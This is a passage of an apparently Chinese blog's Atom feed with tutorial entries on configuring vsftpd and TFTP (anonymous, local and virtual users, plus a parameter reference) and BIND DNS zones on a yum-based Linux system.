    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>LDAP的配置与管理</title>
    <link href="https://marnm.github.io//posts/7733d98/"/>
    <id>https://marnm.github.io//posts/7733d98/</id>
    <published>2022-06-07T04:36:07.000Z</published>
    <updated>2022-06-07T04:56:53.585Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>FTP/TFTP的配置与管理</title>
    <link href="https://marnm.github.io//posts/9d56e705/"/>
    <id>https://marnm.github.io//posts/9d56e705/</id>
    <published>2022-06-07T04:35:55.000Z</published>
    <updated>2022-09-02T17:59:16.392Z</updated>
    
    <content type="html"><![CDATA[<h2 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP"></a>TFTP</h2><blockquote><p>&#x7B80;&#x5355;&#x6587;&#x4EF6;&#x4F20;&#x8F93;&#x534F;&#x8BAE;</p></blockquote><p><strong>&#x5B89;&#x88C5;</strong></p><pre><code class="bash">yum install tftp-server tftp xinetd</code></pre><p><strong>&#x914D;&#x7F6E;</strong></p><pre><code class="bash">vim /etc/xinetd.d/ftpdisable = no</code></pre><blockquote><p>tftp&#x670D;&#x52A1;&#x6587;&#x4EF6;&#x9ED8;&#x8BA4;&#x5B58;&#x653E;&#x76EE;&#x5F55;<br>/var/lib/tftpboot/</p></blockquote><h2 id="FTP-Server"><a href="#FTP-Server" class="headerlink" title="FTP Server"></a>FTP Server</h2><h3 id="&#x7B80;&#x5355;&#x914D;&#x7F6E;"><a href="#&#x7B80;&#x5355;&#x914D;&#x7F6E;" class="headerlink" title="&#x7B80;&#x5355;&#x914D;&#x7F6E;"></a>&#x7B80;&#x5355;&#x914D;&#x7F6E;</h3><blockquote><p><code>/etc/vsftpd/vsftpd.conf</code>  # ftp&#x4E3B;&#x8981;&#x914D;&#x7F6E;&#x6587;&#x4EF6;<br><code>/etc/vsftpd/ftpusers</code> # ftp&#x9ED1;&#x540D;&#x5355;<br><code>/etc/vsftpd/user_list</code> #&#x767D;&#x540D;&#x5355;<br><code>/var/ftp</code> ftp&#x9ED8;&#x8BA4;&#x6839;&#x76EE;&#x5F55;</p></blockquote><p><strong>&#x5B89;&#x88C5;</strong></p><pre><code class="shell">yum install -y vsftp lftp</code></pre><p><strong>&#x533F;&#x540D;&#x8BBF;&#x95EE;FTP&#x914D;&#x7F6E;</strong><br>&#x793A;&#x4F8B;</p><pre><code class="bash"># &#x542F;&#x7528;&#x533F;&#x540D;&#x8BBF;&#x95EE;anonymous_enable=YES# &#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x4E0A;&#x4F20;anon_upload_enable=YES# &#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x521B;&#x5EFA;&#x76EE;&#x5F55;anon_mkdir_write_enable=YES# &#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x4FEE;&#x6539;anon_other_write_enable=YESlocal_enable=YESwrite_enable=YESlocal_umask=022dirmessage_enable=YESxferlog_enable=YESconnect_from_port_20=YESxferlog_std_format=YESlisten=NOlisten_ipv6=YES</code></pre><h3 id="&#x591A;&#x7528;&#x6237;FTP"><a href="#&#x591A;&#x7528;&#x6237;FTP" class="headerlink" title="&#x591A;&#x7528;&#x6237;FTP"></a><strong>&#x591A;&#x7528;&#x6237;FTP</strong></h3><blockquote><p>&#x5173;&#x95ED;&#x533F;&#x540D;&#x8BBF;&#x95EE;</p></blockquote><pre><code class="bash">vim /etc/vsftpd/vsftpd.confanonymous_enable=NO...anon_other_write_enable=NO</code></pre><blockquote><p>&#x6DFB;&#x52A0;FTP&#x7528;&#x6237;</p><pre><code class="bash">useradd -s /sbin/nologin ftp_user1useradd -s /sbin/nologin ftp_user2</code></pre></blockquote><blockquote><p>&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p></blockquote><pre><code class="bash">vim /etc/vsftpd/vsftpd.confchroot_list_enable=YESchroot_list_file=/etc/vsftpd/chroot_listallow_writeable_chroot=YESlocal_enable=YEStouch /etc/vsftpd/chroot_listvim /etc/vsftpd/chroot_listftp_user1ftp_user2</code></pre><p><strong>&#x793A;&#x4F8B;</strong></p><pre><code class="bash">anonymous_enable=NOanon_upload_enable=YESanon_mkdir_write_enable=YESanon_other_write_enable=NOlocal_root=/var/www/htmlchroot_list_enable=YESchroot_list_file=/etc/vsftpd/chroot_listallow_writeable_chroot=YESlocal_enable=YESlocal_umask=022write_enable=YESdirmessage_enable=YESxferlog_enable=YESconnect_from_port_20=YESxferlog_std_format=YESlisten=YES#listen_ipv6=NO</code></pre><h3 id="FTP&#x865A;&#x62DF;&#x7528;&#x6237;"><a href="#FTP&#x865A;&#x62DF;&#x7528;&#x6237;" class="headerlink" title="FTP&#x865A;&#x62DF;&#x7528;&#x6237;"></a>FTP&#x865A;&#x62DF;&#x7528;&#x6237;</h3><blockquote><p><a href="https://access.redhat.com/solutions/54295" target="_blank" rel="noopener">https://access.redhat.com/solutions/54295</a><br>&#x521B;&#x5EFA;FTP&#x767B;&#x5F55;&#x7528;&#x6237;</p></blockquote><pre><code class="bash">vim /etc/vsftpd/login.txtuser1user1_passwduser2user2_passwd</code></pre><blockquote><p>&#x5C06;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x8F6C;&#x6362;&#x4E3A;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;</p></blockquote><pre><code class="bash">db_load -T -t hash -f /etc/vsftpd/login.txt /etc/vsftpd/login.db</code></pre><blockquote><p>&#x9700;&#x4FEE;&#x6539;&#x7528;&#x6237;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6587;&#x4EF6;&#x6743;&#x9650;</p></blockquote><pre><code class="bash">chmod 0600 /etc/vsftpd/login.db</code></pre><blockquote><p>&#x66F4;&#x65B0;vsftpd pam&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p></blockquote><pre><code class="bash">vim /etc/pam.d/vsftpd# &#x5982;&#x679C;&#x4F60;&#x5141;&#x8BB8;ftp&#x865A;&#x62DF;yoghurt&#x8BBF;&#x95EE;&#xFF0C;&#x53EF;&#x4EE5;&#x628A;&#x5176;&#x5B83;&#x7684;&#x5185;&#x5BB9;&#x90FD;&#x6CE8;&#x91CA;&#x6389;auth        required    pam_userdb.so   db=/etc/vsftpd/loginaccount    required   pam_userdb.so    db=/etc/vsftpd/login</code></pre><blockquote><p>&#x4E3A;&#x865A;&#x62DF;&#x7528;&#x6237;&#x521B;&#x5EFA;&#x4E3B;&#x76EE;&#x5F55;</p></blockquote><pre><code class="bash">mkdir /home/ftpmkdir -p /home/ftp/{user1,user2}chown -R ftp:ftp /home/ftp</code></pre><blockquote><p><strong>&#x4FEE;&#x6539;vsftpd&#x914D;&#x7F6E;&#x6587;&#x4EF6;</strong></p></blockquote><pre><code class="bash">vim /etc/vsftpd/vsftpd.conf# &#x589E;&#x52A0;&#x5982;&#x4E0B;&#x53C2;&#x6570;guest_enable=YESguest_username=virtftpuser_sub_token=$USERlocal_root=/home/ftp/$USERchroot_local_user=YES   # &#x5F3A;&#x5236;&#x865A;&#x62DF;&#x7528;&#x6237;&#x53EA;&#x80FD;&#x8BBF;&#x95EE;&#x81EA;&#x5DF1;&#x7684;&#x4E3B;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x6587;&#x4EF6;</code></pre><blockquote><p>&#x521B;&#x5EFA;virtftp&#x7528;&#x6237;</p></blockquote><pre><code class="bash">useradd -d /var/ftp -M -s /sbin/nologin virtftp</code></pre><blockquote><p>&#x521B;&#x5EFA;ftp&#x865A;&#x62DF;&#x7528;&#x6237;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p></blockquote><pre><code class="bash">vim /etc/vsftpd/vsftpd.conf# &#x6DFB;&#x52A0;user_config_dir=/etc/vsftpd/vsftpd_user_confmkdir /etc/vsftpd/vsftpd_user_confecho &quot;anon_world_readable_only=NO&quot; &gt; /etc/vsftpd/vsftpd_user_conf/user1vim /etc/vsftpd/vsftpd_user_conf/user2anon_world_readable_only=NOwrite_enable=YESanon_upload_enable=YES</code></pre><h2 id="vsftpd-conf&#x53C2;&#x6570;&#x8BF4;&#x660E;"><a href="#vsftpd-conf&#x53C2;&#x6570;&#x8BF4;&#x660E;" class="headerlink" title="vsftpd.conf&#x53C2;&#x6570;&#x8BF4;&#x660E;"></a>vsftpd.conf&#x53C2;&#x6570;&#x8BF4;&#x660E;</h2><blockquote><p>&#x539F;&#x6587; <a href="http://vsftpd.beasts.org/vsftpd_conf.html#index" target="_blank" rel="noopener">http://vsftpd.beasts.org/vsftpd_conf.html#index</a></p></blockquote><h3 id="NAME"><a href="#NAME" class="headerlink" title="NAME"></a>NAME</h3><p>vsftpd.conf - vsftpd&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p><h3 id="DESCRIPTION"><a href="#DESCRIPTION" class="headerlink" title="DESCRIPTION"></a>DESCRIPTION</h3><blockquote><p><code>vsftpd.conf</code> &#x7528;&#x4E8E;&#x63A7;&#x5236;vsftpd&#x884C;&#x4E3A;&#x3002;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;vsftpd&#x5728;<code>/etc/vsftpd.conf</code> &#x4F4D;&#x7F6E;&#x67E5;&#x627E;&#x6B64;&#x6587;&#x4EF6;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x60A8;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;vsftpd&#x6307;&#x5B9A;&#x547D;&#x4EE4;&#x884C;&#x53C2;&#x6570;&#x6765;&#x8986;&#x76D6;&#x5B83;&#x3002;</p></blockquote><h3 id="FORMAT"><a href="#FORMAT" class="headerlink" title="FORMAT"></a>FORMAT</h3><blockquote><p><code>vsftpd.conf</code> &#x7684;&#x683C;&#x5F0F;&#x975E;&#x5E38;&#x7B80;&#x5355;&#x3002;&#x6BCF;&#x884C;&#x8981;&#x4E48;&#x662F;&#x6CE8;&#x91CA;&#xFF0C;&#x8981;&#x4E48;&#x662F;&#x6307;&#x4EE4;&#x3002;&#x6CE8;&#x91CA;&#x884C;&#x4EE5;<code>#</code> &#x5F00;&#x5934;&#x5E76;&#x88AB;vsftpd&#x5FFD;&#x7565;&#x3002;</p></blockquote><p><code>options=value</code>  &#x9009;&#x9879;=&#x503C;<br><strong>&#x6CE8;&#x610F;&#xFF01;</strong>&#x5728;&#x6BCF;&#x4E2A;=&#x548C;&#x5DE6;&#x53F3;&#x4E0D;&#x80FD;&#x6709;&#x7A7A;&#x683C;</p><h3 id="&#x5E03;&#x5C14;&#x9009;&#x9879;"><a href="#&#x5E03;&#x5C14;&#x9009;&#x9879;" class="headerlink" title="&#x5E03;&#x5C14;&#x9009;&#x9879;"></a>&#x5E03;&#x5C14;&#x9009;&#x9879;</h3><blockquote><p>&#x4E0B;&#x9762;&#x662F;Boolean&#x9009;&#x9879;&#x5217;&#x8868;&#x3002;&#x5E03;&#x5C14;&#x9009;&#x9879;&#x7684;&#x503C;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x4E3A;YES&#x6216;NO</p></blockquote><p><strong>allow_anon_ssl</strong><br>&#x53EA;&#x6709;<strong>ssl_enable=YES</strong>&#x65F6;&#x624D;&#x9002;&#x7528;&#x3002;&#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x4E3A;YES&#xFF0C;&#x533F;&#x540D;&#x7528;&#x6237;&#x5C06;&#x88AB;&#x5141;&#x8BB8;&#x4F7F;&#x7528;&#x5B89;&#x5168;&#x7684;SSL&#x8FDE;&#x63A5;&#x3002;</p><pre><code>- &#x9ED8;&#x8BA4;&#x503C;&#xFF1A;NO</code></pre><p><strong>anon_mkdir_write_enable</strong><br>    &#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x4E3A;YES&#xFF0C;&#x5C06;&#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x5728;&#x7279;&#x5B9A;&#x6761;&#x4EF6;&#x4E0B;&#x521B;&#x5EFA;&#x65B0;&#x76EE;&#x5F55;&#x3002;&#x4E3A;&#x6B64;&#xFF0C;&#x5FC5;&#x987B;&#x6FC0;&#x6D3B;<strong>write_enable</strong>&#xFF0C;&#x5E76;&#x4E14;ftp&#x533F;&#x540D;&#x7528;&#x6237;&#x5FC5;&#x987B;&#x5BF9;&#x7236;&#x76EE;&#x5F55;&#x5177;&#x6709;&#x5199;&#x6743;&#x9650;</p><pre><code>- &#x9ED8;&#x8BA4;&#x503C;&#xFF1A;NO</code></pre><p><strong>anon_other_write_enable</strong><br># &#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x88AB;&#x6267;&#x884C;&#x9664;&#x4E0A;&#x4F20;&#x548C;&#x521B;&#x5EFA;&#x76EE;&#x5F55;&#x4E4B;&#x5916;&#x7684;&#x5199;&#x64CD;&#x4F5C;&#xFF0C;&#x4F8B;&#x5982;&#x5220;&#x9664;&#x548C;&#x91CD;&#x547D;&#x540D;</p><p><strong>anon_upload_enable</strong><br># &#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x5728;&#x7279;&#x5B9A;&#x6761;&#x4EF6;&#x4E0B;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#xFF0C;&#x5728;<strong>write_enable</strong>&#x6FC0;&#x6D3B;&#x7684;&#x6761;&#x4EF6;&#x4E0B;&#x3002;&#x5E76;&#x4E14;&#x533F;&#x540D;&#x7528;&#x6237;&#x4E0A;&#x4F20;&#x4F4D;&#x7F6E;&#x5177;&#x6709;&#x5199;&#x5165;&#x6743;&#x9650;<br># &#x865A;&#x62DF;&#x7528;&#x6237;&#x4E0A;&#x4F20; &#x4E5F;&#x9700;&#x8981;&#x6B64;&#x8BBE;&#x7F6E;&#xFF1B;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x865A;&#x62DF;&#x7528;&#x6237;&#x5177;&#x6709;&#x533F;&#x540D;&#xFF08;&#x5373;&#x6700;&#x5927;&#x9650;&#x5236;&#xFF09;&#x6743;&#x9650;</p><ul><li>&#x9ED8;&#x8BA4;&#x503C;&#xFF1A;NO</li></ul><p><strong>anon_world_readable_only</strong><br># &#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x4E0B;&#x8F7D;&#x53EF;&#x8BFB;&#x6587;&#x4EF6;&#xFF0C;&#xFF08;&#x4E0D;&#x80FD;&#x5728;ftp&#x4E2D;&#x6253;&#x5F00;&#xFF09;</p><ul><li>&#x9ED8;&#x8BA4;&#x503C;&#xFF1A;YES</li></ul><p><strong>anonymous_enable</strong><br># &#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x767B;&#x5F55;&#xFF0C;&#x9ED8;&#x8BA4;&#x7528;&#x6237;&#x540D;&#xFF1A;<strong>ftp</strong> &#x3001;<strong>anonymous</strong><br>&#x9ED8;&#x8BA4;&#x503C;&#xFF1A;YES</p><p><strong>ascii_download_enable</strong><br># &#x4E0B;&#x8F7D;&#x65F6;&#x91C7;&#x7528;ASCII&#x6A21;&#x5F0F;&#x4F20;&#x8F93;&#x6570;&#x636E;</p><p><strong>ascii_upload_enable</strong><br># &#x4E0A;&#x4F20;&#x65F6;&#x63A5;&#x6536;ASCII&#x6A21;&#x5F0F;&#x6570;&#x636E;&#x4F20;&#x8F93;</p><p><strong>async_abor_enable</strong><br># &#x542F;&#x7528;<code>async ABOR</code> &#x7279;&#x6B8A;FTP&#x547D;&#x4EE4;&#x3002;&#x4E0D;&#x5EFA;&#x8BAE;&#x542F;&#x7528;</p><p><strong>background</strong><br># FTP&#x4EE5;<code>listen</code>&#x6A21;&#x5F0F;&#x542F;&#x52A8;&#xFF0C;</p><p><strong>check_shell</strong><br># &#x8BE5;&#x9009;&#x9879;&#x4EC5;&#x5BF9;&#x975E;PAM&#x6784;&#x5EFA;&#x7684;vsftpd&#x6709;&#x6548;&#x3002;&#x5982;&#x679C;&#x7981;&#x7528;&#xFF0C;vsftpd&#x5C06;&#x4E0D;&#x4F1A;&#x68C0;&#x67E5;/etc/shell&#x4EE5;&#x83B7;&#x53D6;&#x672C;&#x5730;&#x767B;&#x5F55;&#x7684;&#x6709;&#x6548;&#x7528;&#x6237;shell<br>&#x9ED8;&#x8BA4;&#x503C;&#xFF1A;YES</p><p><strong>chmod_enable</strong><br># &#x5141;&#x8BB8;&#x4F7F;&#x7528;SITE CHMOD&#x547D;&#x4EE4;&#x3002;&#x4EC5;&#x4F7F;&#x7528;&#x4E0E;&#x672C;&#x5730;&#x7528;&#x6237;&#x3002;&#x533F;&#x540D;&#x7528;&#x6237;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;SITE CHMOD&#x3002;<br>&#x9ED8;&#x8BA4;&#x503C;&#xFF1A;YES</p><p><strong>chown_uploads</strong><br># &#x6240;&#x6709;&#x533F;&#x540D;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x7684;&#x6240;&#x6709;&#x6743;&#x90FD;&#x5C06;&#x66F4;&#x6539;&#x4E3A;<strong>chown_username</strong>&#x9009;&#x9879;&#x6307;&#x5B9A;&#x7684;&#x7528;&#x6237;&#x3002;</p><p><strong>chroot_list_enable</strong><br># &#x53EA;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x81EA;&#x5DF1;&#x7684;&#x76EE;&#x5F55;&#x3002;<br># &#x5982;&#x679C;&#x542F;&#x7528;<strong>chroot_local_user</strong>&#xFF0C;&#x4E0E;&#x4E0A;&#x8FF0;&#x76F8;&#x53CD;</p><p><strong>chroot_local_user</strong><br># &#x672C;&#x5730;&#x7528;&#x6237;&#x767B;&#x5F55;&#x540E;&#x53EA;&#x80FD;&#x8BBF;&#x95EE;&#x81EA;&#x5DF1;&#x7684;&#x4E3B;&#x76EE;&#x5F55;</p><p><strong>connect_from_port_20</strong><br># &#x63A7;&#x5236;&#x7AEF;&#x53E3;&#x6570;&#x636E;&#x8FDE;&#x63A5;&#x662F;&#x5426;&#x4F7F;&#x7528;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x7AEF;&#x53E3;ftp&#x3002;</p><p><strong>debug_ssl</strong><br># OpenSSL&#x8FDE;&#x63A5;&#x8BCA;&#x65AD;&#x5C06;&#x8F6C;&#x5B58;&#x5230;vsftpd&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x3002;</p><p><strong>delete_failed_uploads</strong><br># &#x5220;&#x9664;&#x4EFB;&#x4F55;&#x5931;&#x8D25;&#x7684;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;</p><p><strong>deny_email_enable</strong><br># &#x5982;&#x679C;&#x6FC0;&#x6D3B;&#xFF0C;&#x60A8;&#x53EF;&#x4EE5;&#x63D0;&#x4F9B;&#x5BFC;&#x81F4;&#x767B;&#x5F55;&#x88AB;&#x62D2;&#x7EDD;&#x7684;&#x533F;&#x540D;&#x5BC6;&#x7801;&#x7535;&#x5B50;&#x90AE;&#x4EF6;&#x54CD;&#x5E94;&#x5217;&#x8868;&#x3002;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5305;&#x542B;&#x6B64;&#x5217;&#x8868;&#x7684;&#x6587;&#x4EF6;&#x662F; /etc/vsftpd.banned_emails&#xFF0C;&#x4F46;&#x60A8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;banned_email_file &#x8BBE;&#x7F6E;&#x8986;&#x76D6;&#x5B83; &#x3002;</p><p><strong>dirlist_enable</strong><br># &#x6240;&#x6709;&#x76EE;&#x5F55;&#x5217;&#x8868;&#x547D;&#x4EE4;&#x90FD;&#x5C06;&#x62D2;&#x7EDD;&#x6388;&#x6743;<br>&#x9ED8;&#x8BA4;&#x503C;&#xFF1A;YES</p><p><strong>dirmessage_enable</strong><br># &#x7528;&#x6237;&#x5728;&#x4ED6;&#x4EEC;&#x7B2C;&#x4E00;&#x6B21;&#x8FDB;&#x5165;&#x65B0;&#x76EE;&#x5F55;&#x65F6;&#x770B;&#x5230;&#x6D88;&#x606F;&#x3002;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x4F1A;&#x626B;&#x63CF;&#x76EE;&#x5F55;&#x4E2D;&#x7684;.message&#x6587;&#x4EF6;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;message_file&#x4FEE;&#x6539;</p><p><strong>download_enable</strong><br># &#x5141;&#x8BB8;&#x4E0B;&#x8F7D;&#x3002;&#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x4E3A;NO&#xFF0C;&#x6240;&#x6709;&#x4E0B;&#x8F7D;&#x8BF7;&#x6C42;&#x90FD;&#x5C06;&#x88AB;&#x62D2;&#x7EDD;<br>&#x9ED8;&#x8BA4;&#x503C;&#xFF1A;YES</p><p><strong>dual_log_enable</strong><br># &#x53CC;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x3002;&#x542F;&#x7528;&#x5C06;&#x751F;&#x6210; <strong>/var/log/xferlog</strong> &#x548C; <strong>/var/log/vsftpd.log</strong>&#x3002;&#x524D;&#x8005;&#x662F;wu-ftpd&#x98CE;&#x683C;&#x7684;&#x4F20;&#x8F93;&#x65E5;&#x5FD7;&#xFF0C;&#x53EF;&#x7531;&#x6807;&#x51C6;&#x5DE5;&#x5177;&#x89E3;&#x6790;&#x3002;&#x540E;&#x8005;&#x662F;vsftpd&#x7684;&#x98CE;&#x683C;&#x65E5;&#x5FD7;&#x3002;</p><p><strong>force_dot_files</strong><br># </p><p><strong>force_anon_data_ssl</strong><br><strong>force_local_logins_ssl</strong><br><strong>guest_enable</strong><br><strong>hide_ids</strong><br><strong>implicit_ssl</strong><br><strong>listen</strong><br><strong>listen_ipv6</strong><br><strong>local_enable</strong><br><strong>lock_upload_files</strong><br><strong>log_ftp_protocol</strong><br><strong>ls_recurse_enable</strong><br><strong>mdtm_write</strong><br><strong>no_anon_password</strong><br><strong>no_log_lock</strong><br><strong>one_process_model</strong><br><strong>passwd_chroot_enable</strong><br><strong>pasv_addr_resolv</strong><br><strong>pasv_enable</strong><br><strong>pasv_promiscuous</strong><br><strong>port_enable</strong><br><strong>port_promiscuous</strong><br><strong>require_cert</strong><br><strong>require_ssl_reuse</strong><br><strong>run_as_launching_user</strong><br><strong>secure_email_list_enable</strong><br><strong>session_support</strong><br><strong>setproctitle_enable</strong><br><strong>ssl_enable</strong><br><strong>ssl_request_cert</strong><br><strong>ssl_sslv2</strong><br><strong>ssl_sslv3</strong><br><strong>ssl_tlsv1</strong><br><strong>strict_ssl_read_eof</strong><br><strong>strict_ssl_write_shutdown</strong><br><strong>syslog_enable</strong><br><strong>tcp_wrappers</strong><br><strong>text_userdb_names</strong><br><strong>tilde_user_enable</strong><br><strong>use_localtime</strong><br><strong>use_sendfile</strong><br><strong>userlist_deny</strong><br><strong>userlist_enable</strong><br><strong>calidate_cert</strong><br><strong>virtual_use_local_privs</strong><br><strong>write_enable</strong><br><strong>xferlog_enable</strong><br><strong>xferlog_std_format</strong></p><h3 id="&#x6570;&#x503C;&#x9009;&#x9879;"><a href="#&#x6570;&#x503C;&#x9009;&#x9879;" class="headerlink" title="&#x6570;&#x503C;&#x9009;&#x9879;"></a>&#x6570;&#x503C;&#x9009;&#x9879;</h3><p><strong>accept_timeout</strong><br><strong>anon_max_rate</strong><br><strong>anon_umask</strong><br><strong>chown_upload_mode</strong><br><strong>connect_timeout</strong><br><strong>data_connection_timeout</strong><br><strong>delay_failed_login</strong><br><strong>delay_successful_login</strong><br><strong>file_open_mode</strong><br><strong>ftp_data_port</strong><br><strong>idle_session_timeout</strong><br><strong>listen_port</strong><br><strong>local_max_rate</strong><br><strong>local_umask</strong><br><strong>max_clients</strong><br><strong>max_login_fails</strong><br><strong>max_per_ip</strong><br><strong>pasv_max_port</strong><br><strong>pasv_min_port</strong><br><strong>trans_chunk_size</strong></p><h3 id="&#x5B57;&#x7B26;&#x4E32;&#x9009;&#x9879;"><a href="#&#x5B57;&#x7B26;&#x4E32;&#x9009;&#x9879;" class="headerlink" title="&#x5B57;&#x7B26;&#x4E32;&#x9009;&#x9879;"></a>&#x5B57;&#x7B26;&#x4E32;&#x9009;&#x9879;</h3><p><strong>anon_root</strong><br><strong>banned_email_file</strong><br><strong>banner_file</strong><br><strong>ca_certs_file</strong><br><strong>chown_username</strong><br><strong>chroot_list_file</strong><br><strong>cmds_allowed</strong><br><strong>cmds_denied</strong><br><strong>deny_file</strong><br><strong>dsa_cert_file</strong><br><strong>dsa_private_key_file</strong><br><strong>email_password_file</strong><br><strong>ftp_username</strong><br><strong>ftpd_banner</strong><br><strong>guest_username</strong><br><strong>hide_file</strong><br><strong>listen_address</strong><br><strong>listen_address6</strong><br><strong>local_root</strong><br><strong>message_file</strong><br><strong>nopriv_user</strong><br><strong>pam_service_name</strong><br><strong>pasv_address</strong><br><strong>rsa_cert_file</strong><br><strong>rsa_private_key_file</strong><br><strong>secure_chroot_dir</strong><br><strong>ssl_ciphers</strong><br><strong>user_config_dir</strong><br><strong>user_sub_token</strong><br><strong>userlist_file</strong><br><strong>vsftpd_log_file</strong><br><strong>xferlog_file</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;TFTP&quot;&gt;&lt;a href=&quot;#TFTP&quot; class=&quot;headerlink&quot; title=&quot;TFTP&quot;&gt;&lt;/a&gt;TFTP&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&amp;#x7B80;&amp;#x5355;&amp;#x6587;&amp;#x4EF6;&amp;#x4F20;&amp;#x8F93;&amp;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>DNS Server的配置与管理</title>
    <link href="https://marnm.github.io//posts/4782a8c2/"/>
    <id>https://marnm.github.io//posts/4782a8c2/</id>
    <published>2022-06-07T04:35:39.000Z</published>
    <updated>2022-09-02T19:16:31.325Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x914D;&#x7F6E;&#x5B9E;&#x73B0;"><a href="#&#x914D;&#x7F6E;&#x5B9E;&#x73B0;" class="headerlink" title="&#x914D;&#x7F6E;&#x5B9E;&#x73B0;"></a>&#x914D;&#x7F6E;&#x5B9E;&#x73B0;</h2><blockquote><p>&#x4FEE;&#x6539;/etc/named.conf&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p></blockquote><pre><code class="bind">options {    listen-on port 53 { any; };    listen-on-v6 port 53 { any; };    ...    allow-query { any; };    ...    recursion yes;  # &#x662F;&#x5426;&#x542F;&#x7528;&#x9012;&#x5F52;&#x67E5;&#x8BE2;    dnssec-enable yes;    dnssec-validation yes;    dnssec-lookaside auto;}...##------------------------------------------------## &#x8BE5;&#x914D;&#x7F6E;&#x5EFA;&#x8BAE;&#x6DFB;&#x52A0;&#x5230;/etc//etc/named.rfc1912.zones# &#x65B0;&#x589E;&#x5982;&#x4E0B;zone &quot;abc.cn&quot; IN {    type master;    file &quot;abc.cn.zone&quot;;};zone &quot;73.168.192.in-addr.arpa&quot; IN {    type master;    file &quot;192.168.73.arpa&quot;;};</code></pre><p><strong>&#x6DFB;&#x52A0;&#x6B63;&#x53CD;&#x5411;&#x89E3;&#x6790;</strong></p><pre><code class="zone"># &#x590D;&#x5236;&#x6B63;&#x5411;&#x89E3;&#x6790;&#x914D;&#x7F6E;&#x6A21;&#x677F;cp -p /var/named/named.localhost /var/named/abc.cn.zone# &#x590D;&#x5236;&#x53CD;&#x5411;&#x89E3;&#x6790;&#x914D;&#x7F6E;&#x6A21;&#x677F;cp -p /var/named/named.empty /var/named/192.168.73.arpa############################################### &#x6DFB;&#x52A0;&#x6B63;&#x5411;&#x89E3;&#x6790;&#x914D;&#x7F6E;vim /var/named/abc.cn.zone</code></pre><pre><code class="ini">$TTL 1Dabc.cn. IN SOA  dns.abc.cn. root.abc.cn. (                    0   ; serial                    1D  ; refresh                    1H  ; retry                    1W  ; expire                    3H )    ; minimumabc.cn. NS  dns.abc.cn.dns.abc.cn. A   192.168.73.5www.abc.cn. A   192.168.73.5www1.abc.cn.    CNAME   www.abc.cn.# 